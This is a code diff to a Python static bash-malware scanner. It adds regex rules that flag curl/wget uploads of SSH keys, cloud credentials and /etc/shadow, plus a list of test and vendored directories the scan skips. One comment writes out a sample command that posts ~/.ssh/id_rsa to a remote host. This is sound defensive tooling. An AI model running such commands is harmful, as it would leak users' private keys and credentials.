@@ -1,15 +1,15 @@
-"""Custom bash malware scanner -- Layer 1 (static/signature), doc 03.
+"""Custom bash malware scanner; Layer 1 (static/signature), doc 03.
 
 No adequate free bash-specific scanner exists, so this is our own (doc 03 sec 1).
 Layer 1 inspects code without executing it, across the full attack surface
 (doc 03 sec 2): enumeration, persistence, lateral movement, exfiltration,
 reverse shells, process injection, credential harvesting, network scanning, and
-obfuscation/evasion. It recursively finds bash and bash-bearing files -- shell
-embedded in setup scripts, CI workflows, Dockerfiles (doc 03 sec 4) -- and emits
+obfuscation/evasion. It recursively finds bash and bash-bearing files; shell
+embedded in setup scripts, CI workflows, Dockerfiles (doc 03 sec 4); and emits
 per-file, categorized findings (doc 03 sec 5).
 
 Layer 2 (sandboxed behavioral execution, doc 03 sec 3.2) is deliberately out of
-scope here -- it is the heavy lift and lands later.
+scope here; it is the heavy lift and lands later.
 
 Pure functions over text/paths: fully unit-testable with no execution.
 """
@@ -52,6 +52,12 @@ _RULES: dict[str, list[tuple[str, re.Pattern]]] = {
     "exfiltration": [
         ("discord-webhook", re.compile(r"discord(?:app)?\.com/api/webhooks/", re.I)),
         ("telegram-bot", re.compile(r"api\.telegram\.org/bot", re.I)),
+        # curl/wget POSTING or UPLOADING a secret FILE is credential exfil (the
+        # data is the tell, not the host): `curl -d @~/.ssh/id_rsa http://x`.
+        ("secret-exfil", re.compile(
+            r"\b(?:curl|wget)\b[^\n]*(?:-d|--data(?:-binary)?|-F|--form|-T|--upload-file)"
+            r"[^\n]*(?:id_rsa|id_ed25519|\.ssh/|\.aws/credentials|/etc/shadow|/etc/passwd|"
+            r"\.env\b|credentials?\.(?:json|ya?ml)|secrets?\.(?:json|ya?ml|txt))", re.I)),
         ("curl-post-data",
          re.compile(r"\bcurl\b.*(?:\s-[dFT]\b|--data\b|--upload-file\b)", re.I)),
         ("archive-then-send", re.compile(r"(tar|zip|gzip)\b[^\n]*\|\s*(curl|nc|wget)", re.I)),
@@ -66,7 +72,8 @@ _RULES: dict[str, list[tuple[str, re.Pattern]]] = {
     "credential_harvest": [
         ("ssh-keys", re.compile(r"id_rsa|id_ed25519|\.ssh/id_", re.I)),
         ("cloud-creds", re.compile(r"\.aws/credentials|\.config/gcloud|\.azure/", re.I)),
-        ("shadow-passwd", re.compile(r"/etc/shadow|/etc/passwd", re.I)),
+        # reads /etc/shadow (password hashes); /etc/passwd is benign/ubiquitous
+        ("shadow-passwd", re.compile(r"/etc/shadow\b", re.I)),
         ("env-token-grab", re.compile(r"\b(AWS_SECRET|GITHUB_TOKEN|NPM_TOKEN|API_KEY)\b", re.I)),
     ],
     "process_injection": [
@@ -101,6 +108,35 @@ _BASH_SUFFIXES = {".sh", ".bash", ".ksh", ".zsh"}
 _EMBEDDED_SUFFIXES = {".yml", ".yaml"}  # CI workflows etc.
 _SHEBANG = re.compile(r"^#!.*\b(ba|z|k)?sh\b")
 _MAX_BYTES = 1_000_000
+
+# Paths that are NOT the repo author's executable payload. Two kinds:
+#   * Vendored/generated trees (THIRD-PARTY code); the tiledesk FP came from
+#     `node_modules/bytes` and `node_modules/content-disposition`.
+#   * Test / fixture / example trees, which legitimately contain attack strings
+#     as data; the crewhaus FP came from a prompt-injection DETECTOR whose
+#     `index.test.ts` cites `webhook.site` / telegram as test fixtures.
+# Excluding both means only first-party, shipped code can confirm a finding.
+# (Names are compared case-insensitively.)
+_IGNORE_DIRS = frozenset({
+    ".git", "node_modules", "bower_components", "vendor", "third_party",
+    "third-party", "dist", "build", "out", ".next", ".nuxt", "target",
+    ".venv", "venv", "virtualenv", "site-packages", "__pycache__", "pods",
+    ".gradle", ".terraform", ".yarn",
+    # non-payload: tests/fixtures/examples carry attack strings as DATA
+    "test", "tests", "__tests__", "spec", "__spec__", "fixtures", "fixture",
+    "__fixtures__", "mocks", "__mocks__", "e2e", "testdata", "examples", "example",
+})
+# Test-file name markers (a test file can live anywhere, e.g. `src/x.test.ts`).
+_TEST_FILE_MARKERS = (".test.", ".spec.", ".stories.", ".fixture.", ".mock.")
+
+
+def is_ignored_path(path: Path) -> bool:
+    """True if a path is vendored/generated or a test/fixture (skip for scanning)."""
+    parts = {p.lower() for p in path.parts}
+    if _IGNORE_DIRS & parts:
+        return True
+    name = path.name.lower()
+    return any(marker in name for marker in _TEST_FILE_MARKERS)
 
 
 @dataclass
@@ -140,7 +176,7 @@ def scan_repo(root: Path) -> list[BashFinding]:
     root = Path(root)
     findings: list[BashFinding] = []
     for path in root.rglob("*"):
-        if not path.is_file() or ".git" in path.parts:
+        if not path.is_file() or is_ignored_path(path):
             continue
         try:
             if path.stat().st_size > _MAX_BYTES:
